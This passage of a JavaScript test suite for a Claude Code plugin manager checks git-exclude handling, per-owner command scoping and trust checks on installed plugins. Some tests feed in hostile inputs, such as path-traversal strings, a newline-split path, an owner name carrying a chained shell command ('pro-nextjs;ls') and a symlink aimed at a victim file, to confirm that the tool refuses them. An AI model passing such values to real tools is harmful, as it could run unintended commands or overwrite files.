      mkdirSync(join(s.repo, GX_DIR), { recursive: true });
      writeFileSync(join(s.repo, GX_FILE), "# hand install\n");
      const r = s.run(["run", "gx", "install"], o);
      if (!/already installed/.test(r.out)) return bad(`not reported installed: ${r.out}`);
      return gxCount(excludeText(s.repo)) === 1 ? ok() : bad(`exclude: ${JSON.stringify(excludeText(s.repo))}`);
    },
  },
  {
    id: "gitExclude/tracked-folder-is-named",
    run: (s) => {
      const o = gxWorld(s);
      mkdirSync(join(s.repo, GX_DIR), { recursive: true });
      writeFileSync(join(s.repo, GX_FILE), "# committed\n");
      gitIn(s.repo, ["add", "-f", GX_FILE]);
      const r = s.run(["run", "gx", "install"], o);
      return /already committed/.test(r.out) && /git rm -r --cached/.test(r.out) ? ok() : bad(`no warning: ${r.out}`);
    },
  },
  {
    id: "gitExclude/added-once-across-install-and-update",
    run: (s) => {
      const o = gxWorld(s);
      const a = s.run(["run", "gx", "install"], o);
      const b = s.run(["run", "gx", "update"], o);
      if (a.code !== 0 || b.code !== 0) return bad(`exit ${a.code}/${b.code}: ${a.out} ${b.out}`);
      if (gxCount(excludeText(s.repo)) !== 1) return bad(`want one line, file: ${JSON.stringify(excludeText(s.repo))}`);
      if (!/added/.test(a.out) || !/already in/.test(b.out)) return bad(`messages: ${a.out} | ${b.out}`);
      return ok();
    },
  },
  {
    id: "gitExclude/git-add-all-leaves-the-folder-untracked",
    run: (s) => {
      const o = gxWorld(s);
      s.run(["run", "gx", "install"], o);
      writeFileSync(join(s.repo, "keep.txt"), "x");
      gitIn(s.repo, ["add", "-A"]);
      const staged = gitIn(s.repo, ["diff", "--cached", "--name-only"]).stdout.split("\n");
      if (!staged.includes("keep.txt")) return bad(`keep.txt not staged: ${staged}`);
      if (staged.some((f) => f.startsWith(".claude/skills/"))) return bad(`skill folder staged: ${staged}`);
      const tracked = gitIn(s.repo, ["ls-files", "--", GX_DIR]).stdout.trim();
      return tracked === "" && existsSync(join(s.repo, GX_FILE)) ? ok() : bad(`tracked: ${tracked}`);
    },
  },
  {
    id: "gitExclude/bad-paths-are-refused-and-nothing-written",
    run: (s) => {
      for (const badPath of ["../x", "/abs/path", "docs/x", ".claude/skills/../../x", ".claude/skills/", ".claude/skills/a\nb/"]) {
        const o = gxWorld(s, [badPath]);
        const r = s.run(["run", "gx", "install"], o);
        if (!/refused/.test(r.out)) return bad(`${JSON.stringify(badPath)} not refused: ${r.out}`);
        const text = excludeText(s.repo);
        if (text.includes("x") && /(^|\n)(\.\.\/x|\/abs\/path|docs\/x)/.test(text)) return bad(`wrote ${badPath}: ${text}`);
        if (/skills\/\.\.|(^|\n)\.claude\/skills\/(\n|$)|a\nb/.test(text)) return bad(`wrote ${JSON.stringify(badPath)}: ${JSON.stringify(text)}`);
        rmSync(join(s.repo, ".claude"), { recursive: true, force: true });
      }
      return ok();
    },
  },
  {
    id: "gitExclude/good-path-written-beside-a-refused-one",
    run: (s) => {
      const o = gxWorld(s, ["../x", GX_DIR]);
      const r = s.run(["run", "gx", "install"], o);
      const text = excludeText(s.repo);
      return /refused/.test(r.out) && gxCount(text) === 1 && !text.includes("../x") ? ok() : bad(`${r.out} | ${JSON.stringify(text)}`);
    },
  },
  {
    id: "gitExclude/not-a-git-repo-is-skipped-with-a-note",
    run: (s) => {
      rmSync(join(s.repo, ".git"), { recursive: true, force: true });
      const o = gxWorld(s);
      const r = s.run(["run", "gx", "install"], o);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      return /not a git work tree/.test(r.out) && !existsSync(join(s.repo, ".git")) ? ok() : bad(`out: ${r.out}`);
    },
  },
  {
    id: "gitExclude/symlinked-exclude-file-is-refused",
    run: (s) => {
      const o = gxWorld(s);
      const victim = join(s.root, "victim.txt");
      writeFileSync(victim, "keep\n");
      mkdirSync(join(s.repo, ".git", "info"), { recursive: true });
      rmSync(excludeFile(s.repo), { force: true });
      symlinkSync(victim, excludeFile(s.repo));
      const r = s.run(["run", "gx", "install"], o);
      return /symlink/.test(r.out) && read(victim) === "keep\n" ? ok() : bad(`victim: ${JSON.stringify(read(victim))} out: ${r.out}`);
    },
  },
  {
    id: "gitExclude/linked-worktree-writes-the-file-git-reads",
    run: (s) => {
      gitIn(s.repo, ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"]);
      const wt = join(s.root, "linked");
      const add = gitIn(s.repo, ["worktree", "add", "-q", "-b", "side", wt]);
      if (add.status !== 0) return bad(`worktree add: ${add.stderr}`);
      s.useRows([gxRow()]);
      s.setPlugins([s.entry("pro-ship", "project", wt)]);
      const r = spawnSync("python3", [s.script, "--repo", wt, "run", "gx", "install"], {
        encoding: "utf8", env: s.env("both", { FAKE_NPX_FILES: GX_FILE }), cwd: wt,
      });
      if (r.status !== 0) return bad(`exit ${r.status}: ${r.stdout}${r.stderr}`);
      const want = gitIn(wt, ["rev-parse", "--git-path", "info/exclude"]).stdout.trim();
      const wantAbs = want.startsWith("/") ? want : join(wt, want);
      if (!existsSync(wantAbs) || gxCount(read(wantAbs)) !== 1) return bad(`not in ${wantAbs}: ${r.stdout}`);
      const ign = gitIn(wt, ["check-ignore", "-q", GX_FILE]);
      return ign.status === 0 ? ok() : bad(`git check-ignore exit ${ign.status}`);
    },
  },
  // --- --owner (R1 to R7) and answerCommitted (R33) --------------------------------
  {
    id: "owner/unknown-or-malformed-owner-exits-2-before-any-claude-call",
    run: (s) => {
      for (const name of ["nobody", "a b", "x/y", "..", "pro-nextjs;ls"]) {
        const r = s.run(["--owner", name, "status", "--json"]);
        if (r.code !== 2) return bad(`${name}: exit ${r.code}: ${r.out}`);
        if (!r.out.includes(`unknown owner: ${name}`)) return bad(`${name}: no unknown owner line: ${r.out}`);
      }
      return existsSync(s.logPath) ? bad(`claude was called: ${read(s.logPath)}`) : ok();
    },
  },
  {
    id: "owner/status-json-lists-only-the-owners-rows-and-adds-owner",
    run: (s, pr) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo), s.entry("pro-design", "project", s.repo)]);
      const all = s.status();
      const st = JSON.parse(s.run(["--owner", "pro-nextjs", "status", "--json"]).stdout);
      if (st.owner !== "pro-nextjs") return bad(`owner field ${st.owner}`);
      const want = registry(pr).engines.filter((r) => r.owner === "pro-nextjs").map((r) => r.id);
      if (!same(st.engines.map((e) => e.id), want)) return bad(`rows ${JSON.stringify(st.engines.map((e) => e.id))}`);
      const { owner, engines, ...rest } = st;
      const { engines: e2, ...rest2 } = all;
      if (!same(rest, rest2)) return bad("a field other than owner and engines changed");
      return same(st.engines, all.engines.filter((e) => e.owner === "pro-nextjs")) ? ok() : bad("row content differs");
    },
  },
  {
    id: "owner/status-text-lists-only-the-owners-rows",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo), s.entry("pro-design", "project", s.repo)]);
      const r = s.run(["--owner", "pro-nextjs", "status"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      return /next-skills:/.test(r.out) && !/impeccable:/.test(r.out) ? ok() : bad(r.out);
    },
  },
  {
    id: "owner/run-all-install-reaches-only-the-owners-argv",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo), s.entry("pro-design", "project", s.repo), s.entry("pro-pdd", "project", s.repo)]);
      const r = s.run(["--owner", "pro-nextjs", "run", "all", "install"], { extra: { FAKE_NPX_FILES: NEXT_FILES } });
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const c = s.calls();
      if (c.length !== 1 || c[0].tool !== "npx" || !c[0].argv.includes("https://github.com/vercel/next.js/tree/canary/skills")) {
        return bad(`calls ${JSON.stringify(c)}`);
      }
      return ok();
    },
  },
  {
    id: "owner/run-all-update-acts-only-on-the-owners-installed-rows",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo), s.entry("pro-design", "project", s.repo)]);
      const files = [".claude/skills/impeccable/SKILL.md", ...["next-cache-components-adoption", "next-cache-components-optimizer",
        "next-partial-prefetching-adoption", "next-partial-prefetching-optimizer", "next-bundle-optimizer", "next-dev-loop"]
        .map((n) => `.claude/skills/${n}/SKILL.md`)];
      for (const f of files) { mkdirSync(dirname(join(s.repo, f)), { recursive: true }); writeFileSync(join(s.repo, f), "---\nname: x\n---\n"); }
      const r = s.run(["--owner", "pro-nextjs", "run", "all", "update"]);
      const c = s.calls();
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      return c.length === 1 && c[0].argv.includes("https://github.com/vercel/next.js/tree/canary/skills") ? ok() : bad(`calls ${JSON.stringify(c)}`);
    },
  },
  {
    id: "owner/run-and-answer-refuse-another-owners-row-and-write-nothing",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo), s.entry("pro-design", "project", s.repo)]);
      const a = s.run(["--owner", "pro-nextjs", "run", "impeccable", "install"]);
      if (a.code !== 2 || !a.out.includes("impeccable: owned by pro-design, not pro-nextjs")) return bad(`run: exit ${a.code}: ${a.out}`);
      const b = s.run(["--owner", "pro-nextjs", "answer", "taste-skill", "yes"]);
      if (b.code !== 2 || !b.out.includes("taste-skill: owned by pro-design, not pro-nextjs")) return bad(`answer: exit ${b.code}: ${b.out}`);
      if (s.calls().length) return bad(`engine tools ran: ${JSON.stringify(s.calls())}`);
      return existsSync(s.answersPath) ? bad("answers file was written") : ok();
    },
  },
  {
    id: "owner/own-row-answer-is-saved",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      const r = s.run(["--owner", "pro-nextjs", "answer", "vercel", "yes"]);
      return r.code === 0 && json(s.answersPath).answers.vercel.answer === "yes" ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "owner/plugins-stale-and-surface-are-refused",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      for (const args of [["plugins", "update"], ["plugins", "swap-starter"], ["stale"], ["stale", "--remove"], ["surface", "vercel"]]) {
        const r = s.run(["--owner", "pro-nextjs", ...args]);
        if (r.code !== 2 || !r.out.includes("not available with --owner; use /pro-dev")) return bad(`${args.join(" ")}: exit ${r.code}: ${r.out}`);
      }
      return s.calls().length ? bad("something ran") : ok();
    },
  },
  {
    id: "owner/run-writes-no-registry-version",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      const r = s.run(["--owner", "pro-nextjs", "run", "all", "install"], { extra: { FAKE_NPX_FILES: NEXT_FILES } });
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      return existsSync(s.answersPath) ? bad(`answers file written: ${read(s.answersPath)}`) : ok();
    },
  },
  {
    id: "owner/run-leaves-an-existing-registry-version-alone",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      mkdirSync(dirname(s.answersPath), { recursive: true });
      writeFileSync(s.answersPath, JSON.stringify({ registryVersion: 1, answers: {} }));
      s.run(["--owner", "pro-nextjs", "run", "all", "install"]);
      return json(s.answersPath).registryVersion === 1 ? ok() : bad(read(s.answersPath));
    },
  },
  {
    id: "owner/retry-lines-name-the-installer-command",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      const i = s.run(["--owner", "pro-nextjs", "run", "all", "install"], { extra: { FAKE_FAIL_MATCH: "next.js" } });
      if (i.code !== 1 || !i.out.includes("/pro-nextjs:install") || i.out.includes("pro-dev.py")) return bad(`install: exit ${i.code}: ${i.out}`);
      if (i.out.includes("/pro-nextjs:install update")) return bad(`install line says update: ${i.out}`);
      const files = ["next-cache-components-adoption", "next-cache-components-optimizer", "next-partial-prefetching-adoption",
        "next-partial-prefetching-optimizer", "next-bundle-optimizer", "next-dev-loop"].map((n) => `.claude/skills/${n}/SKILL.md`);
      for (const f of files) { mkdirSync(dirname(join(s.repo, f)), { recursive: true }); writeFileSync(join(s.repo, f), "---\nname: x\n---\n"); }
      const u = s.run(["--owner", "pro-nextjs", "run", "all", "update"], { extra: { FAKE_FAIL_MATCH: "next.js" } });
      return u.code === 1 && u.out.includes("/pro-nextjs:install update") && !u.out.includes("pro-dev.py") ? ok() : bad(`update: exit ${u.code}: ${u.out}`);
    },
  },
  {
    id: "owner/no-owner-retry-line-still-names-the-script",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      const r = s.run(["run", "all", "install"], { extra: { FAKE_FAIL_MATCH: "next.js" } });
      return r.code === 1 && r.out.includes("pro-dev.py") && !r.out.includes(":install") ? ok() : bad(r.out);
    },
  },
  {
    id: "status/answer-committed-follows-git-ls-files",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      let st = s.status();
      if (!st.engines.every((e) => e.answerCommitted === false)) return bad("no file: expected false everywhere");
      if (s.run(["answer", "vercel", "yes"]).code !== 0) return bad("answer failed");
      st = s.status();
      if (st.engines.some((e) => e.answerCommitted !== false)) return bad("untracked file reported as committed");
      gitIn(s.repo, ["add", "-f", ".claude/pro-dev.json"]);
      st = s.status();
      if (st.engines.find((e) => e.id === "vercel").answerCommitted !== true) return bad("tracked file not reported");
      // a row with no saved answer in a tracked file is still false
      return st.engines.find((e) => e.id === "next-skills").answerCommitted === false ? ok() : bad("row without an answer reported true");
    },
  },
);

// --- pro-dev-owner.py (R10 to R17, R32) -------------------------------------------

const OWNER_PLUGINS = ["pro-nextjs", "pro-design", "pro-testing", "pro-pdd", "pro-egm", "pro-ship"];
const OWNER_SCRIPT = (name) => join(dirname(DEFAULT_PLUGIN_ROOT), name, "scripts", "pro-dev-owner.py");
const GOOD_SRC = { source: { source: "github", repo: "jodybrewster/pro-dev-skillset" } };

// A config dir with the trusted marketplace and a sandbox copy of pro-core under the cache.
function ownerBox(s, pluginRoot, { cfg = join(s.root, "cfg"), versions = ["0.19.0"], market = GOOD_SRC } = {}) {
  const base = join(cfg, "plugins", "cache", MS, "pro-core");
  const paths = {};
  for (const v of versions) {
    paths[v] = join(base, v);
    mkdirSync(paths[v], { recursive: true });
    cpSync(pluginRoot, paths[v], { recursive: true });
  }
  mkdirSync(join(cfg, "plugins"), { recursive: true });
  if (market) writeFileSync(join(cfg, "plugins", "known_marketplaces.json"), JSON.stringify({ [MS]: market }));
  const core = (scope, v, extra = {}) => ({
    id: `pro-core@${MS}`, scope, version: v, enabled: true, installPath: paths[v],
    readFromFolder: "/x", folderVersion: v, installedAt: "t", lastUpdated: "t", projectEnabled: true,
    ...(scope === "user" ? {} : { projectPath: s.repo }), ...extra,
  });
  const go = (args, { owner = "pro-nextjs", extra = {}, bin = "both" } = {}) => {
    const r = spawnSync("python3", [OWNER_SCRIPT(owner), ...args], {
      encoding: "utf8", cwd: s.repo, env: s.env(bin, { CLAUDE_CONFIG_DIR: cfg, ...extra }),
    });
    return { code: r.status, stdout: r.stdout ?? "", stderr: r.stderr ?? "", out: (r.stdout ?? "") + (r.stderr ?? "") };
  };
  return { cfg, paths, core, go };
}

const listCalls = (s) => (existsSync(s.logPath) ? read(s.logPath).trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)) : []);
const refused = (r, text) => (r.code === 2 && r.out.includes(text) ? ok() : bad(`exit ${r.code}: ${r.out}`));

CASES.push(
  {
    id: "owner-script/copies-are-byte-identical",
    run: () => {
      const want = read(OWNER_SCRIPT("pro-nextjs"));
      const lines = want.split("\n").length - 1;
      if (lines >= 150) return bad(`${lines} lines`);
      for (const p of OWNER_PLUGINS) if (read(OWNER_SCRIPT(p)) !== want) return bad(`${p} differs`);
      return ok();
    },
  },
  {
    id: "owner-script/argument-shapes-outside-r12-exit-2-before-any-claude-call",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      s.setPlugins([b.core("project", "0.19.0")]);
      const bads = [[], ["status", "--json", "x"], ["plugins", "update"], ["stale"], ["surface", "vercel"], ["run", "vercel", "install"],
        ["run", "all"], ["run", "all", "remove"], ["answer", "vercel"], ["answer", "vercel", "maybe"], ["answer", "-x", "yes"],
        ["--owner", "pro-egm", "status", "--json"], ["--repo", "/", "status"]];
      for (const a of bads) {
        const r = b.go(a);
        if (r.code !== 2) return bad(`${a.join(" ")}: exit ${r.code}: ${r.out}`);
      }
      return listCalls(s).length ? bad("claude was called") : ok();
    },
  },
  {
    id: "owner-script/refuses-a-marketplace-that-is-not-the-trusted-github-repo",
    run: (s, pr) => {
      const line = "pro-dev-skillset is not the trusted marketplace jodybrewster/pro-dev-skillset; refusing to run its pro-core";
      const sources = [
        { source: { source: "github", repo: "someone/else" } },
        { source: { source: "directory", path: join(s.root, "mp") } },
        { source: { source: "git", url: "https://github.com/jodybrewster/pro-dev-skillset.git" } },
        { source: "github" }, null,
      ];
      for (const [i, market] of sources.entries()) {
        const b = ownerBox(s, pr, { cfg: join(s.root, `cfg${i}`), market });
        s.setPlugins([b.core("user", "0.19.0")]);
        const r = b.go(["status", "--json"]);
        if (r.code !== 2 || !r.out.includes(line)) return bad(`${JSON.stringify(market)}: exit ${r.code}: ${r.out}`);
      }
      return listCalls(s).length ? bad("claude was called") : ok();
    },
  },
  {
    id: "owner-script/trusts-the-github-repo-ignoring-case",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { market: { source: { source: "github", repo: "JodyBrewster/Pro-Dev-Skillset" } } });
      s.setPlugins([b.core("project", "0.19.0")]);
      const r = b.go(["status", "--json"]);
      return r.code === 0 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "owner-script/a-failed-claude-list-refuses-and-reads-no-installed-plugins-file",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      // a valid-looking installed_plugins.json that must never be read
      writeFileSync(join(b.cfg, "plugins", "installed_plugins.json"), JSON.stringify({
        version: 2, plugins: { [`pro-core@${MS}`]: [{ scope: "user", installPath: b.paths["0.19.0"], version: "0.19.0" }] },
      }));
      const line = "cannot read plugin installs: claude plugin list --json failed; run it to see why";
      const missing = b.go(["status", "--json"], { bin: "noClaude" });
      if (missing.code !== 2 || !missing.out.includes(line)) return bad(`no claude: exit ${missing.code}: ${missing.out}`);
      const fail = join(s.root, "bin-fail");
      mkdirSync(fail, { recursive: true });
      writeFileSync(join(fail, "claude"), "#!/bin/sh\nexit 1\n");
      chmodSync(join(fail, "claude"), 0o755);
      const r = spawnSync("python3", [OWNER_SCRIPT("pro-nextjs"), "status", "--json"], {
        encoding: "utf8", cwd: s.repo, env: { PATH: `${fail}:${s.tools}`, HOME: s.home, CLAUDE_CONFIG_DIR: b.cfg },
      });
      return refused({ code: r.status, out: r.stdout + r.stderr }, line);
    },
  },
  {
    id: "owner-script/no-covering-pro-core-refuses-with-the-install-line",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      const line = "pro-core is not installed for this repo; install it with claude plugin install pro-core@pro-dev-skillset";
      s.setPlugins([]);
      const a = b.go(["status", "--json"]);
      if (a.code !== 2 || !a.out.includes(line)) return bad(`empty: exit ${a.code}: ${a.out}`);
      // another repo's project install and a session-scope entry do not count
      s.setPlugins([b.core("project", "0.19.0", { projectPath: join(s.root, "other") }),
        b.core("session", "0.19.0", { projectPath: s.repo }), { ...b.core("user", "0.19.0"), id: "pro-nextjs@" + MS }]);
      const r = b.go(["status", "--json"]);
      return refused(r, line);
    },
  },
  {
    id: "owner-script/a-parent-folder-pro-core-is-never-picked",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { versions: ["0.19.0", "0.19.1"] });
      const line = "pro-core is not installed for this repo";
      s.setPlugins([b.core("project", "0.19.1", { projectPath: dirname(s.repo) })]);
      const a = b.go(["status", "--json"]);
      if (a.code !== 2 || !a.out.includes(line)) return bad(`parent only: exit ${a.code}: ${a.out}`);
      s.setPlugins([b.core("project", "0.19.1", { projectPath: dirname(s.repo) }), b.core("user", "0.19.0")]);
      const r = b.go(["status", "--json"]);
      return r.code === 0 && r.stderr.startsWith(`pro-core 0.19.0 at ${realpathSync(b.paths["0.19.0"])}`) ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "owner-script/a-folder-inside-the-repo-counts-like-covers-repo",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      const sub = join(s.repo, "sub");
      mkdirSync(sub);
      s.setPlugins([b.core("project", "0.19.0", { projectPath: sub })]);
      const r = b.go(["status", "--json"]);
      return r.code === 0 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "owner-script/narrowest-covering-scope-wins",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { versions: ["0.19.0", "0.19.1", "0.19.2"] });
      const at = (v) => `pro-core ${v} at ${realpathSync(b.paths[v])}`;
      s.setPlugins([b.core("user", "0.19.0"), b.core("project", "0.19.1")]);
      const a = b.go(["status", "--json"]);
      if (a.code !== 0 || !a.stderr.startsWith(at("0.19.1"))) return bad(`project over user: ${a.out}`);
      s.setPlugins([b.core("user", "0.19.0"), b.core("project", "0.19.1"), b.core("local", "0.19.2")]);
      const l = b.go(["status", "--json"]);
      if (l.code !== 0 || !l.stderr.startsWith(at("0.19.2"))) return bad(`local first: ${l.out}`);
      // within one scope the entry whose projectPath is the repo root beats one deeper inside it
      const sub = join(s.repo, "sub");
      mkdirSync(sub);
      s.setPlugins([b.core("project", "0.19.0", { projectPath: sub }), b.core("project", "0.19.1")]);
      const e = b.go(["status", "--json"]);
      return e.code === 0 && e.stderr.startsWith(at("0.19.1")) ? ok() : bad(`exact projectPath: ${e.out}`);
    },
  },
  {
    id: "owner-script/a-disabled-narrowest-entry-refuses-beside-an-enabled-user-entry",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { versions: ["0.19.0", "0.19.1"] });
      s.setPlugins([b.core("user", "0.19.0"), b.core("project", "0.19.1", { enabled: false })]);
      const r = b.go(["status", "--json"]);
      if (!r.out.includes("pro-core is disabled for this repo; enable it with claude plugin enable pro-core@pro-dev-skillset") || r.code !== 2) return bad(`exit ${r.code}: ${r.out}`);
      return r.out.includes("pro-core 0.19") ? bad("it reported a pick") : ok();
    },
  },
  {
    id: "owner-script/only-enabled-is-read-never-projectEnabled",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      s.setPlugins([b.core("project", "0.19.0", { enabled: false, projectEnabled: true })]);
      const off = b.go(["status", "--json"]);
      if (off.code !== 2) return bad(`disabled but projectEnabled: exit ${off.code}`);
      s.setPlugins([b.core("project", "0.19.0", { enabled: true, projectEnabled: false })]);
      const on = b.go(["status", "--json"]);
      return on.code === 0 ? ok() : bad(`enabled but not projectEnabled: ${on.out}`);
    },
  },
  {
    id: "owner-script/two-candidates-with-different-install-paths-refuse",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { versions: ["0.19.0", "0.19.1"] });
      s.setPlugins([b.core("project", "0.19.0"), b.core("project", "0.19.1")]);
      const r = b.go(["status", "--json"]);
      if (r.code !== 2 || !r.out.includes("more than one pro-core install covers this repo")) return bad(`exit ${r.code}: ${r.out}`);
      s.setPlugins([b.core("project", "0.19.0"), b.core("project", "0.19.0")]);
      const same2 = b.go(["status", "--json"]);
      return same2.code === 0 ? ok() : bad(`same installPath should pass: ${same2.out}`);
    },
  },
  {
    id: "owner-script/an-install-path-inside-the-repo-is-refused",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { cfg: join(s.repo, ".cfg") });
      s.setPlugins([b.core("project", "0.19.0")]);
      const r = b.go(["status", "--json"]);
      if (r.code !== 2 || !r.out.includes("inside the repo")) return bad(`exit ${r.code}: ${r.out}`);
      return r.out.includes("pro-core 0.19.0 at") ? bad("it announced a pick") : ok();
    },
  },
  {
    id: "owner-script/an-install-path-outside-the-cache-is-refused",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      const elsewhere = join(s.root, "elsewhere", "pro-core");
      mkdirSync(elsewhere, { recursive: true });
      cpSync(pr, elsewhere, { recursive: true });
      s.setPlugins([b.core("project", "0.19.0", { installPath: elsewhere })]);
      const a = b.go(["status", "--json"]);
      if (a.code !== 2 || !a.out.includes("outside")) return bad(`outside: exit ${a.code}: ${a.out}`);
      // a script symlinked out of the cache is judged by its real path
      rmSync(join(b.paths["0.19.0"], "scripts", "pro-dev.py"));
      symlinkSync(join(elsewhere, "scripts", "pro-dev.py"), join(b.paths["0.19.0"], "scripts", "pro-dev.py"));
      s.setPlugins([b.core("project", "0.19.0")]);
      const l = b.go(["status", "--json"]);
      if (l.code !== 2 || !l.out.includes("outside")) return bad(`symlink: exit ${l.code}: ${l.out}`);
      // a missing script is refused too
      rmSync(join(b.paths["0.19.0"], "scripts", "pro-dev.py"));
      const m = b.go(["status", "--json"]);
      return m.code === 2 && m.out.includes("refusing to run") ? ok() : bad(`missing: exit ${m.code}: ${m.out}`);
    },
  },
  {
    id: "owner-script/a-pro-core-below-the-floor-is-refused",
    run: (s, pr) => {
      const b = ownerBox(s, pr, { versions: ["0.18.1"] });
      s.setPlugins([b.core("project", "0.18.1")]);
      const r = b.go(["status", "--json"]);
      return refused(r, "pro-core 0.18.1 is older than 0.19.0; update it with /pro-dev update or claude plugin update pro-core@pro-dev-skillset");
    },
  },
  {
    id: "owner-script/success-runs-pro-dev-with-owner-and-passes-output-through",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      s.setPlugins([b.core("project", "0.19.0"), s.entry("pro-nextjs", "project", s.repo)]);
      const r = b.go(["status", "--json"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      if (!r.stderr.startsWith(`pro-core 0.19.0 at ${realpathSync(b.paths["0.19.0"])}${"/scripts/pro-dev.py"}\n`)) return bad(`first line: ${r.stderr}`);
      const st = JSON.parse(r.stdout);
      if (st.owner !== "pro-nextjs") return bad(`owner ${st.owner}`);
      const want = registry(pr).engines.filter((e) => e.owner === "pro-nextjs").map((e) => e.id);
      if (!same(st.engines.map((e) => e.id), want)) return bad("rows differ from the owner's rows");
      const i = b.go(["run", "all", "install"], { extra: { FAKE_NPX_FILES: NEXT_FILES } });
      if (i.code !== 0) return bad(`run: exit ${i.code}: ${i.out}`);
      const argvs = s.calls().map((c) => `${c.tool} ${c.argv.join(" ")}`);
      const foreign = registry(pr).engines.filter((e) => e.owner !== "pro-nextjs").map((e) => e.id);
      const leaked = foreign.find((id) => argvs.some((a) => a.includes(id)));
      if (leaked) return bad(`another owner's argv reached the log: ${leaked}`);
      return s.calls("npx").length ? ok() : bad("the owner's rows never reached npx");
    },
  },
  {
    id: "owner-script/exit-code-and-stdin-pass-through",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      s.setPlugins([b.core("project", "0.19.0"), s.entry("pro-nextjs", "project", s.repo)]);
      const r = b.go(["run", "all", "install"], { extra: { FAKE_FAIL_MATCH: "next.js" } });
      return r.code === 1 && r.out.includes("/pro-nextjs:install") ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "owner-script/every-copy-uses-its-own-plugin-name-as-the-owner",
    run: (s, pr) => {
      const b = ownerBox(s, pr);
      s.setPlugins([b.core("project", "0.19.0")]);
      for (const p of OWNER_PLUGINS) {
        if (!existsSync(OWNER_SCRIPT(p))) return bad(`${p} has no copy`);
        const r = b.go(["status", "--json"], { owner: p });
        if (r.code !== 0 || JSON.parse(r.stdout).owner !== p) return bad(`${p}: exit ${r.code}: ${r.out}`);
      }
      return ok();
    },
  },
);

// --- spec-kit: the uv-tool row kind, the repo gates and the read-only findings ------------
//
// A fake `uv` answers `tool dir`, `tool dir --bin` and `tool install` (it writes the
// direct_url.json and uv-receipt.toml a real install leaves, with the commit taken from
// `--from`). A fake `specify` appends to a marker file outside the repo whenever it runs
// and, on `init`, writes the fixture's generated files. Neither touches the network.

const SK_SHA = "43486672fe826d230d884815be7cc2026469a6ba";
const SK_OLD = "0123456789abcdef0123456789abcdef01234567";
const SK_TS = "2026-10-27T18:07:43Z";
const SK_URL = "https://github.com/github/spec-kit.git";
const SK_FROM = `git+${SK_URL}@${SK_SHA}`;
const SK_OPTS = "--integration-options=--no-model-invocation --events false";
const SK_INSTALL = ["tool", "install", "specify-cli", "--exclude-newer", SK_TS, "--from", SK_FROM];
const SK_UPDATE = ["tool", "install", "specify-cli", "--force", "--exclude-newer", SK_TS, "--from", SK_FROM];
const SK_INIT = ["init", "--here", "--force", "--non-interactive", "--script", "sh", "--integration", "claude",
  "--ignore-agent-tools", SK_OPTS];
const SK_UPGRADE = ["integration", "upgrade", "claude", SK_OPTS];
const sha256 = (text) => createHash("sha256").update(text).digest("hex");
const skSkill = (name, flag = "disable-model-invocation: true") => `---\nname: ${name}\ndescription: test\n${flag}\n---\nbody ${name}\n`;
const SK_PINNED = {
  ".claude/skills/speckit-specify/SKILL.md": skSkill("speckit-specify"),
  ".claude/skills/speckit-plan/SKILL.md": skSkill("speckit-plan"),
  ".specify/scripts/bash/create-new-feature.sh": "#!/bin/sh\necho feature\n",
  ".specify/templates/spec-template.md": "# spec template\n",
};
const SK_UNPINNED = {
  ".specify/memory/constitution.md": "# constitution\n",
  ".specify/integrations/claude.manifest.json": "{\"files\": {}}\n",
};
const SK_ALL = { ...SK_PINNED, ...SK_UNPINNED };
const SK_SCRIPT = ".specify/scripts/bash/create-new-feature.sh";
const SK_PLAN = ".claude/skills/speckit-plan/SKILL.md";
const SK_SPECIFY = ".claude/skills/speckit-specify/SKILL.md";

const FAKE_UV = `#!/usr/bin/env python3
import json, os, shutil, sys
argv = sys.argv[1:]
log = os.environ.get("FAKE_LOG")
if log:
    with open(log, "a") as f:
        f.write(json.dumps({"tool": "uv", "cwd": os.getcwd(), "argv": argv}) + "\\n")
td, bd = os.environ["FAKE_UV_TOOLDIR"], os.environ["FAKE_UV_BIN"]
if argv == ["tool", "dir"]:
    print(td); sys.exit(0)
if argv == ["tool", "dir", "--bin"]:
    print(bd); sys.exit(0)
if argv[:2] == ["tool", "install"]:
